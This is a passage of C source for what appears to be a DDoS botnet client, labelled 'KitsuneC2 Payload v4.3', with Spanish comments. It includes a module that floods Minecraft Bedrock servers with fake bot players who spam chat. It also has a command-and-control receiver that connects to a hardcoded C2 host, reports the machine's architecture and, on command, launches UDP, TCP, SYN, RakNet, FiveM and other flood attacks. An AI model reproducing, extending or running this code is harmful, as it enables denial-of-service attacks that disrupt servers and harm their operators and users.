            bot->is_closing = 1;
            break;
        }

        if (bot->t_spawn_timeout && now >= bot->t_spawn_timeout && !bot->spawned_ok) {
            printf(YELLOW "[MCBot] %s timeout de spawn\n" RESET, bot->nombre);
            bot->is_closing = 1;
            break;
        }

        // ─── SPAWN FALLBACK (igual que mcbot.c) ──────────────────────────
        if (bot->t_spawn_fallback && now >= bot->t_spawn_fallback) {
            bot->t_spawn_fallback = 0;
            if (!bot->spawned_ok && !bot->is_closing && !g_mcbot_stop_requested && !g_tiempo_terminado) {
                printf(GREEN "[MCBot] %s fallback spawn en %s:%d\n" RESET, bot->nombre, bot->host, bot->port);
                bot->spawned = 1;
                bot->spawned_ok = 1;
                bot->phase = PHASE_GAME_MC;
                bot->t_spawn_timeout = 0;
                bot->t_register = now + rand_range(800, 2500);
                bot->t_start_move_chat = now + rand_range(1000, 3000);
            }
        }

        // Fase UNCONNECTED
        if (bot->phase == PHASE_UNCONNECTED_MC) {
            mcbot_send_ping(bot);
            usleep(100000);
            continue;
        }

        // MTU retry
        if (bot->phase == PHASE_CONNECTING_1_MC && bot->t_mtu_retry && now >= bot->t_mtu_retry) {
            bot->mtu_idx = (bot->mtu_idx + 1) % MTU_LIST_SIZE;
            int mtu = MTU_LIST[bot->mtu_idx];
            int pad = mtu - 28 - 1 - 16 - 1;
            if (pad < 0) pad = 0;
            BufMC b; buf_init_mc(&b);
            w_u8_mc(&b, RAK_OPEN_REQ_1_MC);
            w_magic_mc(&b);
            w_u8_mc(&b, 7);
            for (int i = 0; i < pad; i++) w_u8_mc(&b, 0);
            size_t send_len = (size_t)(mtu - 28) < b.len ? (size_t)(mtu - 28) : b.len;
            sendto(bot->sockfd, b.data, send_len, 0, (struct sockaddr *)&bot->server_addr, sizeof(bot->server_addr));
            buf_free_mc(&b);
            bot->t_mtu_retry = now + 2500;
        }

        // Request2 retry
        if (bot->phase == PHASE_CONNECTING_2_MC && bot->t_req2_retry && now >= bot->t_req2_retry) {
            BufMC req2; buf_init_mc(&req2);
            w_u8_mc(&req2, RAK_OPEN_REQ_2_MC);
            w_magic_mc(&req2);
            w_std_ip_mc(&req2, bot->host, bot->port);
            w_u16be_mc(&req2, bot->mtu_size);
            w_u64be_mc(&req2, bot->client_id);
            sendto(bot->sockfd, req2.data, req2.len, 0, (struct sockaddr *)&bot->server_addr, sizeof(bot->server_addr));
            buf_free_mc(&req2);
            bot->req2_attempt++;
            bot->t_req2_retry = now + 2000 + (bot->req2_attempt * 500);
            if (bot->req2_attempt > 10) bot->is_closing = 1;
        }

        // Keepalive
        if (bot->phase >= PHASE_LOGIN_MC && bot->t_keepalive && now >= bot->t_keepalive) {
            if (!bot->is_closing && !g_mcbot_stop_requested && !g_tiempo_terminado) {
                BufMC ka; buf_init_mc(&ka);
                w_u8_mc(&ka, RAK_CONN_PING_MC);
                w_i64be_mc(&ka, now_unix_ms());
                _send_frame_mc(bot, ka.data, ka.len, 0, 0, 0, 0);
                buf_free_mc(&ka);
            }
            bot->t_keepalive = now + 5000 + rand_range(0, 2000);
        }

        // ─── REGISTER ──────────────────────────────────────────────────
        if (strlen(bot->register_cmd) > 0 && bot->spawned_ok && !bot->register_sent) {
            if (bot->t_register == 0) bot->t_register = now + 1500;
            if (now >= bot->t_register) {
                BufMC rp; build_chat_pkt_mc(bot, bot->register_cmd, &rp);
                send_game_mc(bot, rp.data, rp.len);
                buf_free_mc(&rp);
                bot->register_sent = 1;
                printf(GREEN "[MCBot] %s register enviado: %s\n" RESET, bot->nombre, bot->register_cmd);
            }
        }

        // ─── START MOVEMENT / CHAT (IDÉNTICO a mcbot.c) ──────────────
        if (bot->t_start_move_chat && bot->spawned_ok && now >= bot->t_start_move_chat) {
            bot->t_start_move_chat = 0;
            if (!bot->is_closing && !g_mcbot_stop_requested && !g_tiempo_terminado) {
                // Init movement
                bot->move_ox = bot->pos_x;
                bot->move_oy = bot->pos_y;
                bot->move_oz = bot->pos_z;
                bot->move_dir = ((double)rand() / RAND_MAX) * M_PI * 2.0f;
                bot->move_state = 0;
                bot->t_move = now + 1500 + rand_range(0, 800);
                // Init chat
                if (MENSAJES_COUNT > 0)
                    bot->t_chat = now + bot->intervalo * 1000 + rand_range(-2000, 3000);
            }
        }

        // ─── MOVEMENT TICK ────────────────────────────────────────────
        if (bot->t_move && bot->spawned_ok && !bot->is_closing && now >= bot->t_move && !g_mcbot_stop_requested && !g_tiempo_terminado) {
            if ((double)rand()/RAND_MAX < 0.15) {
                double r2 = (double)rand()/RAND_MAX;
                bot->move_state = r2 < 0.4 ? 1 : (r2 < 0.7 ? 2 : 0);
            }
            if (bot->move_state == 1) {
                bot->pos_yaw = fmod(bot->pos_yaw + (float)((double)rand()/RAND_MAX - 0.5) * 30.0f + 360.0f, 360.0f);
                bot->pos_headyaw = bot->pos_yaw + (float)((double)rand()/RAND_MAX - 0.5) * 45.0f;
                bot->on_ground = 1;
            } else {
                bot->move_dir += (float)((double)rand()/RAND_MAX - 0.5) * 0.7f;
                float speed = 0.2f + (float)((double)rand()/RAND_MAX) * 0.5f;
                bot->pos_x += cosf(bot->move_dir) * speed;
                bot->pos_z += sinf(bot->move_dir) * speed;
                bot->pos_y = bot->move_oy;
                if (bot->move_state == 2) {
                    bot->velocity_y = 0.42f;
                    bot->on_ground = 0;
                    bot->move_state = 0;
                } else {
                    bot->on_ground = 1;
                }
                float dx = bot->pos_x - bot->move_ox, dz = bot->pos_z - bot->move_oz;
                if (dx*dx + dz*dz > 144.0f)
                    bot->move_dir = atan2f(bot->move_oz - bot->pos_z, bot->move_ox - bot->pos_x);
                bot->pos_yaw = fmod(bot->move_dir * 180.0f / (float)M_PI + 90.0f + 360.0f, 360.0f);
                bot->pos_headyaw = bot->pos_yaw + (float)((double)rand()/RAND_MAX - 0.5) * 45.0f;
                bot->pos_pitch = (float)((double)rand()/RAND_MAX - 0.5) * 15.0f;
            }
            if (!bot->on_ground) {
                bot->velocity_y -= 0.08f;
                bot->pos_y += bot->velocity_y;
                if (bot->pos_y <= bot->move_oy) {
                    bot->pos_y = bot->move_oy;
                    bot->velocity_y = 0.0f;
                    bot->on_ground = 1;
                }
            }
            if (!bot->is_closing && !g_mcbot_stop_requested && !g_tiempo_terminado) {
                BufMC mv; build_move_pkt_mc(bot, &mv);
                send_game_mc(bot, mv.data, mv.len);
                buf_free_mc(&mv);
            }
            bot->t_move = now + 1500 + rand_range(0, 800);
        }

        // ─── CHAT SPAM (IDÉNTICO a mcbot.c) ──────────────────────────
        if (bot->t_chat && bot->spawned_ok && !bot->is_closing && now >= bot->t_chat && MENSAJES_COUNT > 0 && !g_mcbot_stop_requested && !g_tiempo_terminado) {
            pthread_mutex_lock(&g_mcbot_mutex);
            int idx = g_global_msg_idx++ % MENSAJES_COUNT;
            pthread_mutex_unlock(&g_mcbot_mutex);
            BufMC cp; build_chat_pkt_mc(bot, MENSAJES[idx], &cp);
            send_game_mc(bot, cp.data, cp.len);
            buf_free_mc(&cp);
            printf(GREEN "[MCBot] %s -> \"%s\"\n" RESET, bot->nombre, MENSAJES[idx]);
            int jitter = rand_range(-2000, 3000);
            bot->t_chat = now + bot->intervalo * 1000 + jitter;
            if (bot->t_chat < now + 1000) bot->t_chat = now + 1000;
        }

        usleep(10000);
    }

    if (bot->sockfd >= 0) { close(bot->sockfd); bot->sockfd = -1; }

    pthread_mutex_lock(&g_mcbot_mutex);
    for (int i = 0; i < g_mcbot_count; i++) {
        if (g_mcbots[i] == bot) {
            g_mcbots[i] = g_mcbots[g_mcbot_count - 1];
            g_mcbot_count--;
            break;
        }
    }
    pthread_mutex_unlock(&g_mcbot_mutex);

    printf(GRAY "[MCBot] %s finalizado\n" RESET, bot->nombre);
    free(bot);
    return NULL;
}

// ─── INICIAR MCBOT ──────────────────────────────────────────────────────
void start_mcbot(const char *ip, int port, const char *nombre, int bots, int tiempo,
                 const char *register_cmd, const char *mensajes, int intervalo) {
    g_mcbot_stop_requested = 0;
    g_tiempo_terminado = 0;
    g_global_msg_idx = 0;

    init_ec_key_mc();
    if (!g_steve_skin_b64_mc) g_steve_skin_b64_mc = build_fallback_skin_mc();

    if (mensajes && strlen(mensajes) > 0) {
        parse_mensajes_mc(mensajes);
    }

    int started = 0;
    for (int i = 0; i < bots && started < MAX_MCBOT_BOTS; i++) {
        MCBot *bot = (MCBot *)calloc(1, sizeof(MCBot));
        if (!bot) continue;
        bot->id = i;
        bot->proto = 84;
        bot->mtu_size = MTU_LIST[0];
        bot->pos_y = 64.0f;
        bot->on_ground = 1;
        bot->running = 1;
        bot->port = port;
        bot->intervalo = intervalo > 0 ? intervalo : 5;
        bot->msg_idx = 0;
        bot->spawned_ok = 0;
        bot->variant_a = 0;
        strncpy(bot->host, ip, sizeof(bot->host)-1);
        bot->host[sizeof(bot->host)-1] = '\0';
        if (register_cmd) {
            if (register_cmd[0] == '/') {
                char pass[16];
                random_pass_mc(pass, sizeof(pass));
                snprintf(bot->register_cmd, sizeof(bot->register_cmd), "%s %s", register_cmd, pass);
            } else {
                strncpy(bot->register_cmd, register_cmd, sizeof(bot->register_cmd)-1);
                bot->register_cmd[sizeof(bot->register_cmd)-1] = '\0';
            }
        }
        random_name_mc(nombre, bot->nombre, MAX_NOMBRE_LEN);
        random_uuid_mc(bot->uuid, sizeof(bot->uuid));
        random_xuid_mc(bot->xuid, sizeof(bot->xuid));
        uint8_t cid_bytes[8]; RAND_bytes(cid_bytes, 8);
        memcpy(&bot->client_id, cid_bytes, 8);

        bot->sockfd = socket(AF_INET, SOCK_DGRAM, 0);
        if (bot->sockfd < 0) { free(bot); continue; }

        struct sockaddr_in local = {0};
        local.sin_family = AF_INET;
        local.sin_port = 0;
        local.sin_addr.s_addr = INADDR_ANY;
        bind(bot->sockfd, (struct sockaddr *)&local, sizeof(local));

        memset(&bot->server_addr, 0, sizeof(bot->server_addr));
        bot->server_addr.sin_family = AF_INET;
        bot->server_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &bot->server_addr.sin_addr);

        bot->phase = PHASE_UNCONNECTED_MC;
        mcbot_send_ping(bot);
        bot->t_mtu_retry = now_ms() + 3000;

        pthread_mutex_lock(&g_mcbot_mutex);
        g_mcbots[g_mcbot_count++] = bot;
        pthread_mutex_unlock(&g_mcbot_mutex);

        pthread_create(&bot->thread, NULL, mcbot_thread, bot);
        pthread_detach(bot->thread);
        started++;
        usleep(200000);
    }

    printf(GREEN "[+] MCBot started: %s:%d (%d bots, %ds)\n" RESET, ip, port, started, tiempo);

    if (tiempo > 0) {
        pthread_t timer_thread;
        int *args = malloc(sizeof(int));
        *args = tiempo;
        pthread_create(&timer_thread, NULL, timer_thread_func, args);
        pthread_detach(timer_thread);
    }
}

void stop_mcbot_all(void) {
    g_mcbot_stop_requested = 1;
    g_tiempo_terminado = 1;

    pthread_mutex_lock(&g_mcbot_mutex);
    printf(YELLOW "[+] Stopping %d MCBots...\n" RESET, g_mcbot_count);
    for (int i = 0; i < g_mcbot_count; i++) {
        if (g_mcbots[i]) {
            g_mcbots[i]->running = 0;
            g_mcbots[i]->is_closing = 1;
        }
    }
    g_mcbot_count = 0;
    pthread_mutex_unlock(&g_mcbot_mutex);
    usleep(500000);
    printf(GREEN "[+] All MCBots stopped\n" RESET);
}

// ─── ATAQUES y C2 ──────────────────────────────────────────────────────
void start_attack(const char *method, const char *ip, int port, int duration, int threads, const char *username) {
    pthread_mutex_lock(&attacks_mutex);
    if (attack_count >= MAX_ATTACKS) {
        pthread_mutex_unlock(&attacks_mutex);
        return;
    }
    Attack *atk = malloc(sizeof(Attack));
    memset(atk, 0, sizeof(Attack));
    strncpy(atk->ip, ip, sizeof(atk->ip)-1);
    atk->ip[sizeof(atk->ip)-1] = '\0';
    atk->port = port;
    atk->duration = duration;
    atk->threads = threads > MAX_THREADS ? MAX_THREADS : threads;
    strncpy(atk->username, username, sizeof(atk->username)-1);
    atk->username[sizeof(atk->username)-1] = '\0';
    strncpy(atk->method, method, sizeof(atk->method)-1);
    atk->method[sizeof(atk->method)-1] = '\0';
    atk->start_time = time(NULL);
    atk->running = 1;
    attacks[attack_count++] = atk;
    pthread_mutex_unlock(&attacks_mutex);

    if (strcasecmp(method, ".MCBOT") == 0) return;

    atk->thread_count = threads;
    atk->threads_arr = malloc(threads * sizeof(pthread_t));
    if (!atk->threads_arr) { atk->running = 0; return; }

    void *(*attack_func)(void *) = NULL;
    if (strcasecmp(method, ".UDP") == 0) attack_func = udp_flood_thread;
    else if (strcasecmp(method, ".TCP") == 0) attack_func = tcp_flood_thread;
    else if (strcasecmp(method, ".SYN") == 0) attack_func = syn_flood_thread;
    else if (strcasecmp(method, ".HEX") == 0) attack_func = hex_flood_thread;
    else if (strcasecmp(method, ".VSE") == 0) attack_func = vse_flood_thread;
    else if (strcasecmp(method, ".MCPE") == 0) attack_func = mcpe_flood_thread;
    else if (strcasecmp(method, ".FIVEM") == 0) attack_func = fivem_flood_thread;
    else if (strcasecmp(method, ".UDPPPS") == 0) attack_func = udppps_flood_thread;
    else if (strcasecmp(method, ".RAKNET") == 0) attack_func = raknet_flood_thread;
    else if (strcasecmp(method, ".UDPQUERY") == 0) attack_func = udpquery_flood_thread;
    else if (strcasecmp(method, ".UDPKILL") == 0) attack_func = udpkill_flood_thread;
    else if (strcasecmp(method, ".UDPBYPASS") == 0) attack_func = udpbypass_flood_thread;
    else if (strcasecmp(method, ".UDPFRAG") == 0) attack_func = udpfrag_flood_thread;
    else if (strcasecmp(method, ".MIX") == 0) attack_func = mix_flood_thread;

    if (attack_func) {
        for (int i = 0; i < threads; i++) {
            pthread_create(&atk->threads_arr[i], NULL, attack_func, atk);
            pthread_detach(atk->threads_arr[i]);
        }
    }
    printf(GREEN "[+] Attack started: %s %s:%d (%ds, %d threads) user: %s\n" RESET,
           method, ip, port, duration, threads, username);
}

void stop_attacks(const char *username) {
    pthread_mutex_lock(&attacks_mutex);
    for (int i = 0; i < attack_count; i++) {
        if (attacks[i] && (strcmp(attacks[i]->username, username) == 0 || strcmp(username, "all") == 0)) {
            attacks[i]->running = 0;
            if (attacks[i]->threads_arr) free(attacks[i]->threads_arr);
            free(attacks[i]);
            attacks[i] = NULL;
        }
    }
    int new_count = 0;
    for (int i = 0; i < attack_count; i++) {
        if (attacks[i]) attacks[new_count++] = attacks[i];
    }
    attack_count = new_count;
    pthread_mutex_unlock(&attacks_mutex);
    printf(YELLOW "[+] Stopped attacks for user: %s\n" RESET, username);
}

// ─── C2 Receiver ──────────────────────────────────────────────────────────
void *c2_receiver(void *arg) {
    BotClient *bot = (BotClient *)arg;
    char buffer[BUFFER_SIZE];
    char args[MAX_ARGS][256];

    while (bot->socket > 0 && !bot->should_exit && running) {
        memset(buffer, 0, BUFFER_SIZE);
        int bytes = recv(bot->socket, buffer, BUFFER_SIZE - 1, 0);
        if (bytes <= 0) { printf(RED "[!] Connection lost\n" RESET); break; }
        buffer[bytes] = 0;
        buffer[strcspn(buffer, "\r\n")] = 0;
        if (strlen(buffer) == 0) continue;

        int argc = 0;
        char *token = strtok(buffer, " ");
        while (token && argc < MAX_ARGS) {
            strncpy(args[argc], token, sizeof(args[argc])-1);
            args[argc][sizeof(args[argc])-1] = '\0';
            argc++;
            token = strtok(NULL, " ");
        }
        if (argc == 0) continue;
        char *cmd = args[0];

        if (strcasecmp(cmd, "PING") == 0) {
            send(bot->socket, "PONG\n", 5, 0);
        }
        else if (strcasecmp(cmd, "STOP") == 0) {
            const char *user = argc >= 2 ? args[1] : "all";
            stop_attacks(user);
            stop_mcbot_all();
            send(bot->socket, "[+] Attacks and MCBots stopped\n", 30, 0);
            printf(YELLOW "[C2] STOP recibido, todo detenido\n" RESET);
        }
        else if (strcasecmp(cmd, ".MCBOT") == 0 && argc >= 8) {
            char *ip = args[1];
            int port = atoi(args[2]);
            char *nombre = args[3];
            int bots = atoi(args[4]);
            int tiempo = atoi(args[5]);
            char *register_cmd = args[6];
            char *mensajes = args[7];
            int intervalo = argc >= 9 ? atoi(args[8]) : 5;
            start_mcbot(ip, port, nombre, bots, tiempo, register_cmd, mensajes, intervalo);
            send(bot->socket, "[+] MCBot started\n", 19, 0);
        }
        else if (strcasecmp(cmd, ".UDP") == 0 || strcasecmp(cmd, ".TCP") == 0 ||
                 strcasecmp(cmd, ".SYN") == 0 || strcasecmp(cmd, ".HEX") == 0 ||
                 strcasecmp(cmd, ".VSE") == 0 || strcasecmp(cmd, ".MCPE") == 0 ||
                 strcasecmp(cmd, ".FIVEM") == 0 || strcasecmp(cmd, ".UDPPPS") == 0 ||
                 strcasecmp(cmd, ".RAKNET") == 0 || strcasecmp(cmd, ".UDPQUERY") == 0 ||
                 strcasecmp(cmd, ".UDPKILL") == 0 || strcasecmp(cmd, ".UDPBYPASS") == 0 ||
                 strcasecmp(cmd, ".UDPFRAG") == 0 || strcasecmp(cmd, ".MIX") == 0) {
            if (argc >= 6) {
                char *ip = args[1];
                int port = atoi(args[2]);
                int duration = atoi(args[3]);
                int threads = atoi(args[4]);
                char *username = args[5];
                if (threads < 1) threads = 1;
                if (threads > MAX_THREADS) threads = MAX_THREADS;
                if (duration < 10) duration = 10;
                if (duration > 1300) duration = 1300;
                start_attack(cmd, ip, port, duration, threads, username);
                char resp[512];
                snprintf(resp, sizeof(resp), "[+] %s attack started\n", cmd);
                send(bot->socket, resp, strlen(resp), 0);
            }
        }
        else {
            printf(GRAY "[*] Unknown command: %s\n" RESET, cmd);
        }
    }
    return NULL;
}

int authenticate(int sock) {
    char buffer[BUFFER_SIZE];
    char arch[32] = "unknown";
    char response[256];
    int bytes;

    FILE *fp = popen("uname -m 2>/dev/null", "r");
    if (fp) {
        if (fgets(arch, sizeof(arch), fp) == NULL) {
            strcpy(arch, "unknown");
        }
        arch[strcspn(arch, "\n")] = 0;
        pclose(fp);
    }

    printf(CYAN "[*] Architecture: %s\n" RESET, arch);

    memset(buffer, 0, BUFFER_SIZE);
    bytes = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes <= 0) return 0;
    buffer[bytes] = 0;

    snprintf(response, sizeof(response), "%s\n", arch);
    send(sock, response, strlen(response), 0);
    printf(GREEN "[*] Sent architecture: %s\n" RESET, arch);

    memset(buffer, 0, BUFFER_SIZE);
    bytes = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes <= 0) return 0;
    buffer[bytes] = 0;

    send(sock, "\xff\xff\xff\xff\75\n", 6, 0);
    printf(GREEN "[*] Sent bot password\n" RESET);

    memset(buffer, 0, BUFFER_SIZE);
    bytes = recv(sock, buffer, BUFFER_SIZE - 1, 0);
    if (bytes <= 0) return 0;
    buffer[bytes] = 0;

    if (strstr(buffer, "Invalid") || strstr(buffer, "invalid") ||
        strstr(buffer, "Login") || strstr(buffer, "Username")) {
        printf(RED "[!] Authentication failed\n" RESET);
        return 0;
    }
    printf(GREEN "[+] Authenticated!\n" RESET);
    return 1;
}

void main_loop() {
    BotClient bot;
    memset(&bot, 0, sizeof(BotClient));
    bot.should_exit = 0;
    int reconnect_attempts = 0;

    while (!bot.should_exit && running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) { sleep(RECONNECT_DELAY); continue; }
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(C2_PORT);
        addr.sin_addr.s_addr = inet_addr(C2_ADDRESS);
        printf(CYAN "[*] Connecting to %s:%d...\n" RESET, C2_ADDRESS, C2_PORT);

        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            printf(YELLOW "[!] Connection failed\n" RESET);
            close(sock);
            sleep(RECONNECT_DELAY);
            reconnect_attempts++;
            continue;
        }
        reconnect_attempts = 0;
        printf(GREEN "[+] Connected!\n" RESET);
        bot.socket = sock;

        if (!authenticate(sock)) {
            close(sock);
            sleep(RECONNECT_DELAY);
            continue;
        }
        bot.is_authenticated = 1;
        pthread_t receiver_thread;
        pthread_create(&receiver_thread, NULL, c2_receiver, &bot);
        pthread_detach(receiver_thread);

        while (bot.socket > 0 && !bot.should_exit && running) {
            sleep(1);
            static int keepalive_count = 0;
            keepalive_count++;
            if (keepalive_count >= 20) {
                keepalive_count = 0;
                send(sock, "PING\n", 5, 0);
            }
        }
        if (bot.socket > 0) { close(bot.socket); bot.socket = -1; }
        bot.is_authenticated = 0;
        if (!running) break;
        printf(YELLOW "[!] Disconnected, reconnecting in %ds...\n" RESET, RECONNECT_DELAY);
        sleep(RECONNECT_DELAY);
    }
}

void signal_handler(int sig) {
    printf("\n" YELLOW "[!] Signal received, stopping...\n" RESET);
    running = 0;
    g_mcbot_stop_requested = 1;
    g_tiempo_terminado = 1;
    stop_attacks("all");
    stop_mcbot_all();
    if (bot_socket > 0) { close(bot_socket); bot_socket = -1; }
}

static void print_usage(const char *prog) {
    printf(CYAN "Uso standalone:\n" RESET);
    printf("  %s <ip> <puerto> <nombre> <bots> <tiempo> [register] [mensajes] [intervalo]\n\n", prog);
    printf("  ip        — IP del servidor PocketMine-MP\n");
    printf("  puerto    — Puerto (normalmente 19132)\n");
    printf("  nombre    — Prefijo de nombre de bot (se añade número)\n");
    printf("  bots      — Cantidad de bots\n");
    printf("  tiempo    — Duración en segundos (0 = indefinido)\n");
    printf("  register  — Comando de registro, ej: /register  (- para omitir)\n");
    printf("  mensajes  — Mensajes separados por | para spam  (- para omitir)\n");
    printf("  intervalo — Segundos entre mensajes (defecto: 5)\n\n");
    printf("Ctrl+C para detener todos los bots limpiamente.\n\n");
    printf(GRAY "Sin argumentos: modo C2 (conecta a %s:%d)\n" RESET, C2_ADDRESS, C2_PORT);
}

int main(int argc, char **argv) {
    srand(time(NULL));
    signal(SIGINT,  signal_handler);
    signal(SIGTERM, signal_handler);

    OPENSSL_init_crypto(OPENSSL_INIT_ADD_ALL_CIPHERS | OPENSSL_INIT_ADD_ALL_DIGESTS, NULL);

    if (argc >= 3) {
        const char *ip       = argv[1];
        int         port     = atoi(argv[2]);
        const char *nombre   = argc >= 4 ? argv[3] : "Bot";
        int         bots     = argc >= 5 ? atoi(argv[4]) : 1;
        int         tiempo   = argc >= 6 ? atoi(argv[5]) : 0;
        const char *reg      = (argc >= 7 && strcmp(argv[6], "-") != 0) ? argv[6] : NULL;
        const char *mensajes = (argc >= 8 && strcmp(argv[7], "-") != 0) ? argv[7] : "";
        int         intervalo = argc >= 9 ? atoi(argv[8]) : 5;

        if (port <= 0 || port > 65535) {
            fprintf(stderr, RED "[!] Puerto inválido: %s\n" RESET, argv[2]);
            return 1;
        }

        printf(CYAN "\n[+] MCBot Standalone\n" RESET);
        printf(GRAY "[*] Servidor  : %s:%d\n" RESET, ip, port);
        printf(GRAY "[*] Bots      : %d\n" RESET, bots);
        printf(GRAY "[*] Duración  : %s\n" RESET, tiempo > 0 ? argv[5] : "indefinida (Ctrl+C para stop)");
        if (reg)             printf(GRAY "[*] Register  : %s\n" RESET, reg);
        if (mensajes && strlen(mensajes) > 0 && strcmp(mensajes, "-") != 0)
            printf(GRAY "[*] Mensajes  : %s\n" RESET, mensajes);
        printf("\n");

        start_mcbot(ip, port, nombre, bots, tiempo, reg, mensajes, intervalo);

        while (running && !g_tiempo_terminado) {
            sleep(1);
        }

        printf(YELLOW "\n[+] Deteniendo bots...\n" RESET);
        stop_mcbot_all();
        sleep(1);
        printf(GREEN "[+] Todos los bots detenidos.\n" RESET);
        return 0;
    }

    if (argc == 2 && (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0)) {
        print_usage(argv[0]);
        return 0;
    }

    printf(CYAN "\n[+] KitsuneC2 Payload v4.3 (MCBot con spam IDÉNTICO a mcbot.c)\n" RESET);
    printf(GRAY "[*] C2: %s:%d\n" RESET, C2_ADDRESS, C2_PORT);
    printf(GRAY "[*] Usa '%s -h' para modo standalone\n\n" RESET, argv[0]);

    while (running) { main_loop(); }
    printf(GREEN "[+] Payload detenido\n" RESET);
    return 0;
}
